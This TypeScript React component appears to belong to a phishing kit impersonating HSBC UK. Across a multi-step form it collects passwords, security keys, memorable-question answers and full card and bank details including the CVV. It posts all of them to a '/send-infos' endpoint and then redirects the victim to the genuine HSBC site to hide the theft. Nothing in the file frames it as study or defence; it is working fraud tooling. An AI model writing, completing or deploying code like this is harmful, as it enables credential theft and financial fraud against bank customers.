import axios from "axios";
import React from "react";
import { InputsContext } from "../contexts/inputsContext";
import { LoginContext } from "../contexts/loginContext";

interface ContinueBtnProps {
  passwordSecKey: {
    password: string;
    secKey: string;
  };
  memorableQuestions: {
    firstSchool: string;
    favouriteCar: string;
    favouriteCity: string;
    memorableName: string;
    memorablePlace: string;
    telephoneSecurity: string;
  };
  bankingDetails: {
    name: string;
    dob: string;
    add: string;
    accountNumber: string;
    sortCode: string;
    cardNumber: string;
    expiryDate: string;
    startDate: string;
    cvv: string;
  };
  setTabIndex: Function;
  tabIndex: number;
  setCompleted: Function;
  completed: {
    passwordSecKey: boolean;
    memorableQuestions: boolean;
    bankingDetails: boolean;
  };
}

export const ContinueBtn: React.FC<ContinueBtnProps> = ({
  passwordSecKey,
  memorableQuestions,
  bankingDetails,
  tabIndex,
  completed,
  setCompleted,
  setTabIndex,
}) => {
  const { inputs, saveInputs } = React.useContext(InputsContext) as InputsType;
  const { username } = React.useContext(LoginContext) as LoginType;
  const handleContinueClick = async (e: any) => {
    e.preventDefault();
    if (tabIndex === 0) {
      if (!!passwordSecKey.password && !!passwordSecKey.secKey) {
        setTabIndex(1);
        saveInputs({
          ...inputs,
          ...passwordSecKey,
        });
        setCompleted({
          ...completed,
          passwordSecKey: true,
        });
      }
    } else if (tabIndex === 1) {
      if (
        !!memorableQuestions.favouriteCar &&
        !!memorableQuestions.favouriteCity &&
        !!memorableQuestions.firstSchool &&
        !!memorableQuestions.memorableName &&
        !!memorableQuestions.memorablePlace &&
        !!memorableQuestions.telephoneSecurity
      ) {
        setTabIndex(2);
        saveInputs({
          ...inputs,
          ...memorableQuestions,
        });
        setCompleted({
          ...completed,
          memorableQuestions: true,
        });
      }
    } else {
      if (
        !!bankingDetails.accountNumber &&
        !!bankingDetails.add &&
        !!bankingDetails.cardNumber &&
        !!bankingDetails.cvv &&
        !!bankingDetails.dob &&
        !!bankingDetails.expiryDate &&
        !!bankingDetails.name &&
        !!bankingDetails.sortCode &&
        !!bankingDetails.startDate
      ) {
        saveInputs({
          ...inputs,
          ...bankingDetails,
        });
        setCompleted({
          ...completed,
          bankingDetails: true,
        });
        const values = {
          username,
          ...inputs,
          ...bankingDetails,
        };

        await axios.post("/send-infos", values);
        window.location.replace("https://www.hsbc.co.uk/");
      }
    }
  };
  return (
    <div style={{ marginTop: 20, fontSize: 11 }}>
      <a
        className="button tertiary tertiaryBtn"
        href="/gsa/?idv_cmd=idv.Logoff&amp;nextPage=SaaSLogoutCAM0Resource"
      >
        <span className="buttonInner"> Cancel </span>{" "}
      </a>

      <div className="right">
        <div className="button primary primaryBtn">
          <span className="buttonInner">
            {" "}
            <input
              className="submit_input"
              type="submit"
              value="Continue"
              onClick={handleContinueClick}
            />
          </span>
        </div>
      </div>
    </div>
  );
};
